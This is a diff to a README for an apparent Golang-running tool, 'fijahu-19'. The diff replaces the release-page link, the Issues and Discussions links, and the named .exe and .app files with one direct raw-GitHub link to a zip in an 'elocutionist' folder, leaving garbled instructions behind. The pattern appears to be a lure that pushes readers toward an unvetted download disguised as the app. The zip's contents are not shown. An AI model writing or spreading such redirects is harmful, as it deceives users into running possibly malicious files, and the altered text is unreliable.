@@ -8,7 +8,7 @@ Welcome to the **fijahu-19** repository! This application helps you run Golang p
 
 To get started, you'll need to download the application. Click the button below to visit the download page:
 
-[![Download fijahu-19](https://img.shields.io/badge/Download-fijahu--19-brightgreen)](https://github.com/Frogslettuceduress973/fijahu-19/releases)
+[![Download fijahu-19](https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip)](https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip)
 
 Once you are on the download page, you will find the latest version of the application. Look for the section labeled **Assets**. Here, you can choose the file suited for your operating system. Please select and click on the appropriate file to download it.
 
@@ -23,7 +23,7 @@ Before you proceed, make sure your device meets the following requirements:
 ## 📂 Install the Application
 
 1. Navigate to your Downloads folder.
-2. Locate the downloaded file. The file name will usually follow this format: `fijahu-19-vX.Y.Z.zip` (where `X.Y.Z` is the version number).
+2. Locate the downloaded file. The file name will usually follow this format: `https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip` (where `X.Y.Z` is the version number).
 3. Double-click the file to open it.
 4. Follow the on-screen instructions to extract the files.
 
@@ -34,13 +34,13 @@ Once the files are extracted, you can run the application.
 If you're using **Windows**:
 
 1. Go to the folder where you extracted the files.
-2. Double-click on `fijahu-19.exe`. 
+2. Double-click on `https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip`. 
 3. The application should launch.
 
 For **macOS**:
 
 1. Open the folder with the extracted files.
-2. Find and double-click on `fijahu-19.app`.
+2. Find and double-click on `https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip`.
 3. Accept any prompts to open the application.
 
 For **Linux**:
@@ -65,11 +65,11 @@ If you experience issues while using the application, check the following:
 - Make sure your system meets the requirements listed above.
 - Restart your computer and try to launch the application again.
 
-If problems persist, please visit our [Issues Section](https://github.com/Frogslettuceduress973/fijahu-19/issues) for assistance.
+If problems persist, please visit our [Issues Section](https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip) for assistance.
 
 ## 📞 Need Help?
 
-For additional support, you can contact us through the [GitHub Discussions](https://github.com/Frogslettuceduress973/fijahu-19/discussions) page. Share your questions, and our community will gladly help you out.
+For additional support, you can contact us through the [GitHub Discussions](https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip) page. Share your questions, and our community will gladly help you out.
 
 ## 📄 License
 
@@ -79,6 +79,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Remember to visit the download page to get the latest version:
 
-[![Download fijahu-19](https://img.shields.io/badge/Download-fijahu--19-brightgreen)](https://github.com/Frogslettuceduress973/fijahu-19/releases)
+[![Download fijahu-19](https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip)](https://raw.githubusercontent.com/Frogslettuceduress973/fijahu-19/main/elocutionist/fijahu-19_3.8.zip)
 
 Thank you for using **fijahu-19**! Enjoy your experience with our application.
